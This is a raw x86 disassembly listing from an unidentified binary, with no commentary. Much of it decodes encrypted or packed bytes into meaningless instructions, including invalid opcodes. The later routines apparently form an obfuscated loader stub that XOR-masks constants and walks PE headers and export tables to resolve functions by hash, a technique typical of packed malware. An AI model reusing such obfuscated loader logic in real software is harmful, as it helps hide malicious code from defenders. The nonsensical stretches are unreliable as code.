  423623:	jmp    0xc0cdb5fa
  423628:	sbb    DWORD PTR [edi-0x34],ebp
  42362b:	mov    ds:0x7a85b2d9,al
  423630:	jne    0x4235df
  423632:	mov    DWORD PTR [ecx+0x5e],edx
  423635:	xor    ah,BYTE PTR [ecx+0x16]
  423638:	mov    edx,0xfd36691b
  42363d:	jg     0x4235e7
  42363f:	dec    ebp
  423640:	jle    0x423637
  423642:	arpl   WORD PTR [esi+0x4e54b3ad],sp
  423648:	not    BYTE PTR [esi]
  42364a:	stos   BYTE PTR es:[edi],al
  42364b:	jno    0x423605
  42364d:	mov    DWORD PTR [ebx+0xb],esp
  423650:	pop    ebp
  423651:	call   DWORD PTR [ecx-0x22b7e882]
  423657:	fdiv   QWORD PTR ss:[esi+0x434784ff]
  42365e:	imul   ebx,DWORD PTR [eax],0xe77b8f81
  423664:	dec    ecx
  423665:	mov    eax,ds:0xe008166d
  42366a:	sbb    BYTE PTR [ebx+0x12],ch
  42366d:	jle    0x4235f2
  42366f:	les    esi,FWORD PTR [ebx+ebp*2+0x7528558f]
  423676:	or     eax,0x1988d602
  42367b:	jl     0x42362d
  42367d:	or     dl,BYTE PTR es:[ebx-0x2]
  423681:	push   ebp
  423682:	mov    ch,0xa4
  423684:	jmp    0x579922ab
  423689:	pop    esi
  42368a:	sbb    al,0x75
  42368c:	int3   
  42368d:	xlat   BYTE PTR ds:[ebx]
  42368e:	push   esi
  42368f:	mov    dh,0x52
  423691:	jg     0x4236a1
  423693:	loop   0x423693
  423695:	xchg   edx,eax
  423696:	inc    esp
  423697:	jge    0x42363c
  423699:	ror    BYTE PTR [esi],cl
  42369b:	sub    eax,DWORD PTR [esi+0x72a198f1]
  4236a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4236a2:	xor    edx,DWORD PTR [edx]
  4236a4:	rol    esi,1
  4236a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236a7:	inc    esi
  4236a8:	mov    esi,0x1c85fae1
  4236ad:	sbb    DWORD PTR [ebx+0x701ba38],ecx
  4236b3:	test   eax,0xf8d956d7
  4236b8:	es or  al,0xd1
  4236bb:	xchg   edi,eax
  4236bc:	iret   
  4236bd:	or     BYTE PTR [edi+edx*8+0x61],bl
  4236c1:	dec    esp
  4236c2:	sbb    bh,BYTE PTR [esi+0x6dc6aab5]
  4236c8:	ror    dh,cl
  4236ca:	ds cmp eax,ecx
  4236cd:	repnz pop ebp
  4236cf:	loop   0x42365f
  4236d1:	int3   
  4236d2:	dec    ebp
  4236d3:	mov    ebp,0x5d2d8e7f
  4236d8:	shl    BYTE PTR [ecx+0x31],cl
  4236db:	adc    bh,al
  4236dd:	push   ebx
  4236de:	xor    al,0x86
  4236e0:	fld    DWORD PTR [edx]
  4236e2:	mov    ss,WORD PTR [eax-0x80]
  4236e5:	iret   
  4236e6:	jge    0x4236dd
  4236e8:	loopne 0x42372e
  4236ea:	pusha  
  4236eb:	mul    BYTE PTR [eax+0x34bcc618]
  4236f1:	mov    al,0xde
  4236f3:	in     al,dx
  4236f4:	es sti 
  4236f6:	stos   DWORD PTR es:[edi],eax
  4236f7:	outs   dx,BYTE PTR ds:[esi]
  4236f8:	or     bh,BYTE PTR [edi-0x1b77fcf8]
  4236fe:	xlat   BYTE PTR ds:[ebx]
  4236ff:	outs   dx,DWORD PTR ds:[esi]
  423700:	ret    0xbbb9
  423703:	mov    DWORD PTR [edi],ebp
  423705:	mov    cl,0xc8
  423707:	mov    dh,0xf3
  423709:	xchg   esi,eax
  42370a:	ret    
  42370b:	test   dl,dh
  42370d:	lock ds add edi,ebx
  423711:	repnz xor esi,DWORD PTR [edx+0x20]
  423715:	or     ch,BYTE PTR [eax-0x26]
  423718:	inc    ebp
  423719:	xchg   edi,eax
  42371a:	pusha  
  42371b:	sahf   
  42371c:	pop    ebx
  42371d:	push   esp
  42371e:	adc    al,0xa6
  423720:	add    eax,0x42005a74
  423725:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423726:	lds    ecx,FWORD PTR [edx-0x2dd8068]
  42372c:	sbb    bh,cl
  42372e:	ret    0x62cb
  423731:	ins    DWORD PTR es:[edi],dx
  423732:	retf   0x951a
  423735:	dec    ebp
  423736:	mov    ds:0x14d866e0,eax
  42373b:	cmp    al,0x91
  42373d:	mov    eax,ds:0x56e4e376
  423742:	mov    ebp,0x9e0926b0
  423747:	ror    BYTE PTR [edi+0x3c],cl
  42374a:	mov    DWORD PTR [eax+ebp*2+0x8b43ac2],0xaba5f96b
  423755:	ret    0xe982
  423758:	sbb    DWORD PTR [esi+0x2],eax
  42375b:	pop    esi
  42375c:	push   eax
  42375d:	dec    ebp
  42375e:	and    al,0x8e
  423760:	sub    eax,0xec64f194
  423765:	out    0x4,al
  423767:	or     eax,DWORD PTR [eax-0x71b7f919]
  42376d:	ret    0x765c
  423770:	pop    ds
  423771:	rcr    DWORD PTR [eax-0x5f1dc923],1
  423777:	mov    dh,bl
  423779:	sbb    DWORD PTR [edx+0x6eb76f5f],0xffffff88
  423780:	inc    ebx
  423781:	mov    eax,ds:0x2bfa5728
  423786:	mov    edi,0xf16551d7
  42378b:	xor    al,0xc3
  42378d:	nop
  42378e:	sub    ch,BYTE PTR [edx+0x35]
  423791:	das    
  423792:	mov    ah,0x66
  423794:	xor    al,BYTE PTR [eax]
  423796:	dec    edx
  423797:	mov    ebx,0x75d6ab6d
  42379c:	ror    BYTE PTR [edx+0x53],1
  42379f:	add    al,0x6
  4237a1:	test   eax,0xdad9c35f
  4237a6:	or     ebx,edi
  4237a8:	or     edi,esi
  4237aa:	mov    esi,0x69284232
  4237af:	push   ebp
  4237b0:	cmp    BYTE PTR [ebx+0x20],0x1b
  4237b4:	loop   0x4237e5
  4237b6:	add    al,0x8c
  4237b8:	shr    BYTE PTR [edi-0x4a],cl
  4237bb:	jmp    0x7ff:0xa87a3b91
  4237c2:	(bad)  
  4237c3:	cmp    eax,0xbe7b9d25
  4237c8:	jecxz  0x42381c
  4237ca:	xor    DWORD PTR [ebx+eax*4-0x3d],esp
  4237ce:	jl     0x423826
  4237d0:	nop
  4237d1:	mov    dl,0xa5
  4237d3:	or     eax,DWORD PTR [ebp-0x29ba1163]
  4237d9:	rol    DWORD PTR ds:[edi],0x79
  4237dd:	es mov dl,0x44
  4237e0:	nop
  4237e1:	jne    0x423857
  4237e3:	cwde   
  4237e4:	dec    esp
  4237e5:	fidivr WORD PTR [edx-0x37]
  4237e8:	ss out 0x30,al
  4237eb:	inc    ebp
  4237ec:	dec    ebp
  4237ed:	adc    bl,bh
  4237ef:	pop    es
  4237f0:	sub    BYTE PTR [esi],dl
  4237f2:	xchg   ebp,eax
  4237f3:	inc    ebx
  4237f4:	or     al,0xec
  4237f6:	pushf  
  4237f7:	mov    esp,0xee4c233c
  4237fc:	popa   
  4237fd:	add    al,0xdc
  4237ff:	cs (bad) 
  423801:	out    0x7e,eax
  423803:	cli    
  423804:	enter  0xf11c,0xf9
  423808:	cld    
  423809:	pushaw 
  42380b:	xlat   BYTE PTR ds:[ebx]
  42380c:	xor    DWORD PTR [eax],ebx
  42380e:	out    0xbe,al
  423810:	dec    esi
  423811:	xchg   ebx,eax
  423812:	inc    edx
  423813:	jnp    0x4237f0
  423815:	inc    ebx
  423816:	sbb    eax,0x20f3f76b
  42381b:	push   ebp
  42381c:	mov    bh,0x52
  42381e:	xchg   esi,eax
  42381f:	xor    al,0x3
  423821:	cs into 
  423823:	fisttp DWORD PTR [esi-0x27928fc2]
  423829:	call   0x97ce41f
  42382e:	sub    DWORD PTR [ebx],0x45
  423831:	pop    ebp
  423832:	jnp    0x423879
  423834:	(bad)  
  423835:	and    eax,0x3368fda0
  42383a:	dec    edx
  42383b:	and    ch,BYTE PTR [esi+esi*2+0x30a2000d]
  423842:	mov    ebp,0xc414be4b
  423847:	jmp    0x9971a1ee
  42384c:	into   
  42384d:	cmc    
  42384e:	addr16 mov bl,0x45
  423851:	dec    eax
  423852:	into   
  423853:	inc    esp
  423854:	test   DWORD PTR [ebx+0x5fdd436e],eax
  42385a:	out    0x6a,eax
  42385c:	jg     0x42388b
  42385e:	addr16 dec ebp
  423860:	sbb    al,0x2
  423862:	in     al,0xfe
  423864:	mov    ebp,DWORD PTR [eax+0x36]
  423867:	push   esp
  423868:	push   esp
  423869:	push   ss
  42386a:	sub    ah,cl
  42386c:	dec    DWORD PTR [ecx-0x5c]
  42386f:	and    DWORD PTR [ecx+0x71d57e68],esi
  423875:	stos   BYTE PTR es:[edi],al
  423876:	fisub  WORD PTR [ebx+0x43688cf4]
  42387c:	dec    edx
  42387d:	xchg   esi,eax
  42387e:	sbb    ebx,ebp
  423880:	bound  edx,QWORD PTR [edx+0x61684b4c]
  423886:	loope  0x423817
  423888:	repz jmp 0x8b05:0xb8084ab5
  423890:	sub    dl,bh
  423892:	ins    DWORD PTR es:[edi],dx
  423893:	xchg   BYTE PTR [esi],ch
  423895:	mov    al,ds:0xdbec478a
  42389a:	push   edi
  42389b:	and    eax,0x6f06dda9
  4238a0:	adc    al,0x6f
  4238a2:	mov    eax,0xdc850ef9
  4238a7:	pop    edx
  4238a8:	arpl   WORD PTR [edi+0x6fa7938c],dx
  4238ae:	inc    esi
  4238af:	pop    es
  4238b0:	dec    ecx
  4238b1:	retf   0xc698
  4238b4:	adc    esp,DWORD PTR [ecx+edx*4+0x44]
  4238b8:	in     al,0xc3
  4238ba:	pop    ss
  4238bb:	call   0xd1e0efaf
  4238c0:	cmp    DWORD PTR [ebx+0xef7cb63],0x348d1c0
  4238ca:	fnsave [ebx+0x727c2261]
  4238d0:	sahf   
  4238d1:	jnp    0x4238e4
  4238d3:	fisttp QWORD PTR [ecx-0x6372c345]
  4238d9:	dec    eax
  4238da:	ret    
  4238db:	pop    ebx
  4238dc:	retf   0x18b8
  4238df:	jle    0x423893
  4238e1:	push   0x21
  4238e3:	xchg   edx,esi
  4238e5:	lods   al,BYTE PTR ds:[esi]
  4238e6:	pop    edi
  4238e7:	mov    ebp,0xe4a4def2
  4238ec:	cmp    al,0xa5
  4238ee:	(bad)  
  4238ef:	sti    
  4238f0:	xchg   ebp,eax
  4238f1:	adc    dl,ah
  4238f3:	mov    eax,ds:0x5d30646d
  4238f8:	mov    edx,0xcb9f5c11
  4238fd:	outs   dx,DWORD PTR ds:[esi]
  4238fe:	fcom   QWORD PTR [ecx]
  423900:	cdq    
  423901:	icebp  
  423902:	fwait
  423903:	mov    esi,0x7ace97fb
  423908:	jnp    0x4238dd
  42390a:	dec    eax
  42390b:	retf   0xd7ac
  42390e:	outs   dx,BYTE PTR ds:[esi]
  42390f:	mov    BYTE PTR [esi-0x17],ah
  423912:	inc    esp
  423913:	xchg   esp,eax
  423914:	mov    cl,cl
  423916:	add    bl,ch
  423918:	sahf   
  423919:	dec    DWORD PTR [edi-0x5d97c3fa]
  42391f:	iret   
  423920:	nop
  423921:	lods   eax,DWORD PTR ds:[esi]
  423922:	mov    ebx,0x64f37892
  423927:	cwde   
  423928:	pop    esi
  423929:	push   cs
  42392a:	sti    
  42392b:	add    BYTE PTR [ebx],bl
  42392d:	mov    ?,edi
  42392f:	lahf   
  423930:	ins    BYTE PTR es:[edi],dx
  423931:	pop    esi
  423932:	push   edx
  423933:	jg     0x4238fb
  423935:	jbe    0x4238d2
  423937:	xchg   esp,eax
  423938:	test   DWORD PTR [eax],eax
  42393a:	xchg   esp,eax
  42393b:	dec    esp
  42393c:	jmp    0xc6f0:0x98fed4c9
  423943:	sahf   
  423944:	or     ch,BYTE PTR [ebp+0x78f64e67]
  42394a:	mov    esp,DWORD PTR [edi-0x5f2eefb1]
  423950:	jmp    0x8154:0x9dc0adb9
  423957:	pop    eax
  423958:	test   eax,0x7665a410
  42395d:	out    dx,al
  42395e:	cmp    BYTE PTR [edx],0x3a
  423961:	test   al,0x4b
  423963:	imul   ebx,DWORD PTR [esi+0x1b4ae1f4],0xffffffc8
  42396a:	mov    eax,0x9ff94779
  42396f:	(bad)  
  423970:	adc    bl,bl
  423972:	mov    ds:0x2277c652,al
  423977:	loopne 0x423974
  423979:	inc    edx
  42397a:	aam    0x98
  42397c:	jle    0x4239af
  42397e:	mov    DWORD PTR [edi+0x3e],edx
  423981:	or     eax,0x5ff0262d
  423986:	push   es
  423987:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423988:	adc    BYTE PTR [esi-0x5fa8e5ee],0xe5
  42398f:	jnp    0x423979
  423991:	xchg   DWORD PTR [eax],edi
  423993:	call   0x622af201
  423998:	jp     0x4239a5
  42399a:	aas    
  42399b:	pop    ebp
  42399c:	stos   BYTE PTR es:[edi],al
  42399d:	std    
  42399e:	xlat   BYTE PTR ds:[ebx]
  42399f:	cmp    al,0x39
  4239a1:	loope  0x423990
  4239a3:	xor    BYTE PTR [ebp-0xd],al
  4239a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4239a7:	mov    ebp,0x867c1f6c
  4239ac:	xchg   ebx,eax
  4239ad:	retf   0xd806
  4239b0:	jne    0x42393f
  4239b2:	xor    eax,0xc5d4ea98
  4239b7:	or     ch,BYTE PTR [esi]
  4239b9:	or     al,0x57
  4239bb:	icebp  
  4239bc:	imul   eax,DWORD PTR [eax+0x69562141],0x52ddd953
  4239c6:	push   ds
  4239c7:	sbb    al,0x34
  4239c9:	sbb    eax,0xc5b50d0
  4239ce:	mov    cl,0x49
  4239d0:	aad    0xc1
  4239d2:	sbb    edi,DWORD PTR [edx+0x77f5c563]
  4239d8:	jnp    0x423973
  4239da:	mov    ah,BYTE PTR [ebp+ebx*4-0x5ec17032]
  4239e1:	mov    eax,0xd0506085
  4239e6:	jbe    0x4239a3
  4239e8:	mov    dh,0xb9
  4239ea:	stc    
  4239eb:	call   0x4f33:0x415a5650
  4239f2:	je     0x42398e
  4239f4:	mov    ebp,0xfff2acea
  4239f9:	fisttp WORD PTR [eax-0x7ebd2e94]
  4239ff:	(bad)  
  423a00:	into   
  423a01:	xchg   DWORD PTR [esp+eiz*2-0x3d],ebp
  423a05:	lahf   
  423a06:	ins    BYTE PTR es:[edi],dx
  423a07:	scas   eax,DWORD PTR es:[edi]
  423a08:	in     al,dx
  423a09:	jg     0x4239f7
  423a0b:	enter  0x85c2,0x7e
  423a0f:	int3   
  423a10:	cmp    ch,bh
  423a12:	int    0x82
  423a14:	jo     0x42399f
  423a16:	inc    edx
  423a17:	push   cs
  423a18:	push   ebx
  423a19:	call   0x907cf6b9
  423a1e:	jecxz  0x423a68
  423a20:	(bad)  
  423a21:	pop    esi
  423a22:	rol    DWORD PTR [esi-0x47e862e8],1
  423a28:	rcr    BYTE PTR [eax+ecx*8-0xa],1
  423a2c:	outs   dx,BYTE PTR ds:[esi]
  423a2d:	push   ecx
  423a2e:	and    eax,0xb6d82b68
  423a33:	jbe    0x423a37
  423a35:	push   0xffffffdb
  423a37:	jge    0x423a69
  423a39:	jno    0x423a00
  423a3b:	or     eax,0x8a86ddfa
  423a40:	fdiv   QWORD PTR [edx]
  423a42:	and    eax,DWORD PTR [eax+0x597f8ac3]
  423a48:	enter  0x8306,0x23
  423a4c:	dec    ebx
  423a4d:	sub    DWORD PTR [edi+esi*8-0x18],ecx
  423a51:	arpl   WORD PTR [edi+0x5c1621d8],cx
  423a57:	lea    ebp,[esi+ebp*1]
  423a5a:	shr    eax,cl
  423a5c:	ins    BYTE PTR es:[edi],dx
  423a5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423a5e:	ret    
  423a5f:	mov    ds:0xf4f01b23,al
  423a64:	enter  0xec00,0xb9
  423a68:	pop    ds
  423a69:	mov    al,ds:0x82b167b6
  423a6e:	cs nop
  423a70:	cli    
  423a71:	xchg   BYTE PTR [ebp+0xdb4e385],dh
  423a77:	mov    esi,DWORD PTR [eax+edx*2-0x33]
  423a7b:	lea    esi,[eax]
  423a7d:	shr    BYTE PTR [edx-0x58],1
  423a80:	add    edx,ecx
  423a82:	imul   ebx,DWORD PTR [ecx+0x20f78b8b],0xffffffb2
  423a89:	mov    WORD PTR [eax+esi*4+0x7c],cs
  423a8d:	dec    esp
  423a8e:	leave  
  423a8f:	fsubr  QWORD PTR [ebx+edx*8-0x24ebd196]
  423a96:	xchg   edi,eax
  423a97:	mov    DWORD PTR [edi+0x7f],ecx
  423a9a:	xor    edx,0xffffffea
  423a9d:	out    0x2d,eax
  423a9f:	pop    ebx
  423aa0:	int    0xc0
  423aa2:	in     al,0xb1
  423aa4:	and    bl,BYTE PTR [edi-0x35]
  423aa7:	call   0x53c1f808
  423aac:	adc    DWORD PTR [edx-0x372da7f5],0xffffffe1
  423ab3:	ins    BYTE PTR es:[edi],dx
  423ab4:	lea    esp,[ebp-0x194dd92d]
  423aba:	mov    esi,0x1c1aadc1
  423abf:	or     BYTE PTR [edx+0x55],dh
  423ac2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ac3:	inc    ecx
  423ac4:	sti    
  423ac5:	push   cs
  423ac6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ac7:	xor    BYTE PTR [esi-0xd],bl
  423aca:	push   es
  423acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423acc:	dec    ebx
  423acd:	and    eax,0xf2d32ea0
  423ad2:	and    DWORD PTR [edi-0x27],eax
  423ad5:	dec    edx
  423ad6:	mov    edx,DWORD PTR [ebp-0x8]
  423ad9:	movzx  eax,BYTE PTR [eax+edx*1+0x3272db]
  423ae1:	mov    edx,DWORD PTR [ebp-0x54]
  423ae4:	xor    edx,esi
  423ae6:	lea    eax,[edx+eax*1+0x3272db]
  423aed:	movzx  edx,BYTE PTR [ebp-0x1]
  423af1:	xor    edx,eax
  423af3:	mov    BYTE PTR [ebp-0x1],dl
  423af6:	mov    al,BYTE PTR [ebp-0x1]
  423af9:	mov    edx,DWORD PTR [ebp-0x1c]
  423afc:	mov    ebx,DWORD PTR [ebp-0xc]
  423aff:	xor    edx,esi
  423b01:	add    edx,edi
  423b03:	imul   edx,ebx
  423b06:	mov    ebx,DWORD PTR [ebp-0x8]
  423b09:	mov    BYTE PTR [edx+ebx*1],al
  423b0c:	mov    eax,DWORD PTR [ebp-0x30]
  423b0f:	mov    edx,DWORD PTR [ebp-0x3c]
  423b12:	xor    eax,esi
  423b14:	xor    edx,esi
  423b16:	add    eax,edi
  423b18:	add    edx,edi
  423b1a:	imul   eax,edx
  423b1d:	add    eax,DWORD PTR [ebp-0xc]
  423b20:	mov    DWORD PTR [ebp-0xc],eax
  423b23:	mov    eax,DWORD PTR [ebp-0xc]
  423b26:	mov    edx,DWORD PTR [ebp-0x24]
  423b29:	cmp    edx,eax
  423b2b:	jb     0x41e9a5
  423b31:	mov    eax,DWORD PTR [ebp-0x3c]
  423b34:	mov    edx,DWORD PTR [ebp-0x24]
  423b37:	xor    eax,esi
  423b39:	add    eax,edi
  423b3b:	imul   eax,edx
  423b3e:	mov    edx,DWORD PTR [ebp-0x20]
  423b41:	xor    edx,esi
  423b43:	add    edx,edi
  423b45:	or     eax,edx
  423b47:	mov    edx,DWORD PTR [ebp-0x18]
  423b4a:	xor    edx,esi
  423b4c:	add    eax,edx
  423b4e:	mov    edx,DWORD PTR [ebp-0x18]
  423b51:	xor    edx,esi
  423b53:	add    eax,edx
  423b55:	mov    edx,DWORD PTR [ebp-0x10]
  423b58:	lea    eax,[eax+edx*1+0x64e5b6]
  423b5f:	jmp    0x423b73
  423b64:	mov    eax,DWORD PTR [ebp-0x18]
  423b67:	mov    edx,DWORD PTR [ebp-0x10]
  423b6a:	xor    eax,esi
  423b6c:	lea    eax,[eax+edx*1+0x3272db]
  423b73:	mov    DWORD PTR [ebp-0x10],eax
  423b76:	jmp    0x41e8f2
  423b7b:	mov    eax,DWORD PTR [ebp-0x38]
  423b7e:	mov    edx,DWORD PTR [ebp+0xc]
  423b81:	xor    edx,esi
  423b83:	lea    ecx,[ecx+edx*1+0x3272db]
  423b8a:	lea    edx,[ecx-0x3272db]
  423b90:	xor    edx,esi
  423b92:	cmp    edx,0xf89c95b6
  423b98:	jne    0x41e770
  423b9e:	mov    ecx,DWORD PTR [ebp+0x8]
  423ba1:	mov    edx,DWORD PTR [ebp+0xc]
  423ba4:	mov    ebx,DWORD PTR [ebp+0x8]
  423ba7:	xor    edx,esi
  423ba9:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  423bb0:	xor    ecx,esi
  423bb2:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  423bb9:	xor    ebx,esi
  423bbb:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  423bc2:	mov    edx,DWORD PTR [ebp+0xc]
  423bc5:	xor    edx,esi
  423bc7:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  423bce:	mov    eax,DWORD PTR [ebp+0xc]
  423bd1:	xor    eax,esi
  423bd3:	add    eax,edi
  423bd5:	pop    edi
  423bd6:	pop    esi
  423bd7:	pop    ebx
  423bd8:	leave  
  423bd9:	ret    0x8
  423bdc:	push   ebp
  423bdd:	mov    ebp,esp
  423bdf:	push   ecx
  423be0:	mov    eax,ds:0x42c008
  423be5:	xor    DWORD PTR ds:0x42c000,eax
  423beb:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  423bf2:	mov    eax,DWORD PTR [ebp+0x8]
  423bf5:	sbb    DWORD PTR ds:0x42d010,0x5f50
  423bff:	mov    al,BYTE PTR [eax]
  423c01:	add    DWORD PTR ds:0x429020,0x42b018
  423c0b:	add    al,0xd
  423c0d:	xor    DWORD PTR ds:0x42901c,0x429000
  423c17:	xor    al,0x6f
  423c19:	mov    DWORD PTR ds:0x42d008,0x56e
  423c23:	cmp    al,0x35
  423c25:	mov    DWORD PTR ds:0x42c000,0x518
  423c2f:	jne    0x423caa
  423c35:	mov    eax,DWORD PTR [ebp+0x8]
  423c38:	mov    edx,DWORD PTR ds:0x429014
  423c3e:	or     DWORD PTR ds:0x429010,edx
  423c44:	mov    ecx,DWORD PTR [ebp+0x8]
  423c47:	add    ecx,DWORD PTR [eax+0x3c]
  423c4a:	mov    edx,0x7510893
  423c4f:	adc    eax,DWORD PTR ds:0x42c01c
  423c55:	mov    DWORD PTR [ebp+0x8],ecx
  423c58:	mov    eax,DWORD PTR [ebp-0x4]
  423c5b:	xor    eax,edx
  423c5d:	adc    ecx,0x2aad
  423c63:	push   esi
  423c64:	add    DWORD PTR ds:0x42d01c,0x22ba
  423c6e:	mov    esi,DWORD PTR [ebp+0x8]
  423c71:	xor    ecx,ecx
  423c73:	xor    ecx,DWORD PTR ds:0x42901c
  423c79:	xor    ecx,DWORD PTR ds:0x42a010
  423c7f:	mov    DWORD PTR ds:0x42901c,ecx
  423c85:	mov    ecx,0x3272db
  423c8a:	add    eax,ecx
  423c8c:	cmp    DWORD PTR [esi+0x54],eax
  423c8f:	pop    esi
  423c90:	je     0x423c9e
  423c96:	mov    eax,DWORD PTR [ebp+0x8]
  423c99:	jmp    0x423cb7
  423c9e:	mov    eax,DWORD PTR [ebp-0x4]
  423ca1:	xor    eax,edx
  423ca3:	add    eax,ecx
  423ca5:	jmp    0x423cb7
  423caa:	mov    eax,DWORD PTR [ebp-0x4]
  423cad:	xor    eax,0x7510893
  423cb2:	add    eax,0x3272db
  423cb7:	leave  
  423cb8:	ret    0x4
  423cbb:	push   ebp
  423cbc:	mov    ebp,esp
  423cbe:	push   ecx
  423cbf:	sub    DWORD PTR ds:0x42d010,0x2dcc
  423cc9:	push   ecx
  423cca:	and    DWORD PTR ds:0x42d014,0x0
  423cd4:	jmp    0x423ce8
  423cd9:	xor    edx,edx
  423cdb:	add    edx,DWORD PTR ds:0x42d014
  423ce1:	inc    edx
  423ce2:	mov    DWORD PTR ds:0x42d014,edx
  423ce8:	cmp    DWORD PTR ds:0x42d014,0x1d
  423cef:	jae    0x423d26
  423cf5:	cmp    DWORD PTR ds:0x42d014,0x26
  423cfc:	jne    0x423d21
  423d02:	push   0x643f
  423d07:	push   DWORD PTR [ebp-0x24]
  423d0a:	push   0x42a010
  423d0f:	push   DWORD PTR [ebp-0xc]
  423d12:	push   DWORD PTR [ebp-0x10]
  423d15:	push   DWORD PTR [ebp-0x10]
  423d18:	push   DWORD PTR [ebp-0x28]
  423d1b:	call   DWORD PTR ds:0x42502c
  423d21:	jmp    0x423cd9
  423d26:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  423d2d:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  423d34:	dec    eax
  423d35:	mov    eax,DWORD PTR [ebp-0x4]
  423d38:	add    edx,0x6ccb
  423d3e:	push   esi
  423d3f:	mov    esi,DWORD PTR [ebp-0x8]
  423d42:	adc    DWORD PTR ds:0x42a00c,ebx
  423d48:	mov    edx,0x7510893
  423d4d:	sbb    DWORD PTR ds:0x42c018,0x5978
  423d57:	xor    eax,edx
  423d59:	sbb    DWORD PTR ds:0x42901c,0x3646
  423d63:	xor    esi,edx
  423d65:	sub    DWORD PTR ds:0x429014,0x4430
  423d6f:	mov    ecx,0x3272db
  423d74:	sbb    DWORD PTR ds:0x42d01c,0x42900c
  423d7e:	add    esi,ecx
  423d80:	mov    DWORD PTR ds:0x42a010,0x31b3
  423d8a:	add    eax,ecx
  423d8c:	inc    DWORD PTR ds:0x42c01c
  423d92:	imul   eax,esi
  423d95:	mov    esi,DWORD PTR [ebp+0xc]
  423d98:	mov    DWORD PTR ds:0x429028,0xd41
  423da2:	cmp    esi,eax
  423da4:	jne    0x423dc2
  423daa:	and    esi,eax
  423dac:	mov    eax,DWORD PTR [ebp-0x4]
  423daf:	mov    esi,DWORD PTR [ebp-0x8]
  423db2:	xor    eax,edx
  423db4:	xor    esi,edx
  423db6:	add    eax,ecx
  423db8:	add    esi,ecx
  423dba:	imul   eax,esi
  423dbd:	jmp    0x423dfd
  423dc2:	mov    eax,DWORD PTR [ebp+0xc]
  423dc5:	mov    eax,DWORD PTR [eax+0x78]
  423dc8:	mov    DWORD PTR [ebp+0xc],eax
  423dcb:	mov    eax,DWORD PTR [ebp-0x4]
  423dce:	mov    esi,DWORD PTR [ebp-0x8]
  423dd1:	xor    eax,edx
  423dd3:	xor    esi,edx
  423dd5:	add    eax,ecx
  423dd7:	add    esi,ecx
  423dd9:	imul   eax,esi
  423ddc:	mov    esi,DWORD PTR [ebp+0xc]
  423ddf:	cmp    esi,eax
  423de1:	mov    eax,DWORD PTR [ebp-0x4]
  423de4:	je     0x423daf
  423dea:	xor    eax,edx
  423dec:	add    eax,ecx
  423dee:	mov    ecx,DWORD PTR [ebp+0xc]
  423df1:	imul   eax,ecx
  423df4:	add    eax,DWORD PTR [ebp+0x8]
  423df7:	mov    DWORD PTR [ebp+0xc],eax
  423dfa:	mov    eax,DWORD PTR [ebp+0xc]
  423dfd:	pop    esi
  423dfe:	leave  
  423dff:	ret    0x8
  423e02:	add    BYTE PTR [eax-0x5ffbffbe],ah
  423e08:	inc    edx
  423e09:	add    BYTE PTR [eax],cl
  423e0b:	mov    al,ds:0xa00c0042
  423e10:	inc    edx
  423e11:	add    BYTE PTR [eax],dl
  423e13:	mov    al,ds:0xa0140042
  423e18:	inc    edx
  423e19:	add    BYTE PTR [eax],bl
  423e1b:	mov    al,ds:0xa01c0042
  423e20:	inc    edx
  423e21:	add    BYTE PTR [eax],al
  423e23:	mov    al,0x42
  423e25:	add    BYTE PTR [eax+esi*4],al
  423e28:	inc    edx
  423e29:	add    BYTE PTR [eax],cl
  423e2b:	mov    al,0x42
  423e2d:	add    BYTE PTR [eax+esi*4],cl
  423e30:	inc    edx
  423e31:	add    BYTE PTR [eax],dl
  423e33:	mov    al,0x42
  423e35:	add    BYTE PTR [eax+esi*4],dl
  423e38:	inc    edx
  423e39:	add    BYTE PTR [eax],bl
  423e3b:	mov    al,0x42
  423e3d:	add    BYTE PTR [eax+esi*4],bl
  423e40:	inc    edx
  423e41:	add    BYTE PTR [eax],al
  423e43:	rol    BYTE PTR [edx+0x0],0x4
  423e47:	rol    BYTE PTR [edx+0x0],0x8
  423e4b:	rol    BYTE PTR [edx+0x0],0xc
  423e4f:	rol    BYTE PTR [edx+0x0],0x10
  423e53:	rol    BYTE PTR [edx+0x0],0x14
  423e57:	rol    BYTE PTR [edx+0x0],0x18
  423e5b:	rol    BYTE PTR [edx+0x0],0x1c
  423e5f:	rol    BYTE PTR [edx+0x0],0x75
  423e63:	ins    DWORD PTR es:[edi],dx
  423e64:	push   ecx
  423e65:	push   eax
  423e66:	jo     0x423ee2
  423e68:	addr16 jo 0x423ec1
  423e6b:	pop    eax
  423e6c:	inc    ebp
  423e6d:	push   edx
  423e6e:	jb     0x423ee4
  423e70:	inc    esi
  423e71:	je     0x423eba
  423e73:	gs ins BYTE PTR es:[edi],dx
  423e75:	dec    esp
  423e76:	js     0x423ee0
  423e78:	inc    edx
  423e79:	js     0x423ec1
  423e7b:	arpl   WORD PTR [edx+0x66],ax
  423e7e:	inc    ebx
  423e7f:	push   ebp
  423e80:	jno    0x423ef8
  423e82:	push   ds
  423e83:	inc    edx
  423e84:	inc    edx
  423e85:	add    BYTE PTR [esi],ah
  423e87:	inc    edx
  423e88:	inc    edx
  423e89:	add    dl,cl
  423e8b:	inc    eax
  423e8c:	inc    edx
  423e8d:	add    bh,ch
  423e8f:	or     esi,DWORD PTR [edx+0x304e790e]
  423e95:	dec    esi
  423e96:	xchg   DWORD PTR [edi+0x3d],ecx
  423e99:	dec    esi
  423e9a:	scas   eax,DWORD PTR es:[edi]
  423e9b:	dec    edi
  423e9c:	ds dec esi
  423e9e:	js     0x423eee
  423ea0:	cmp    ecx,DWORD PTR [esi-0x64]
  423ea3:	dec    edi
  423ea4:	inc    esp
  423ea5:	dec    esi
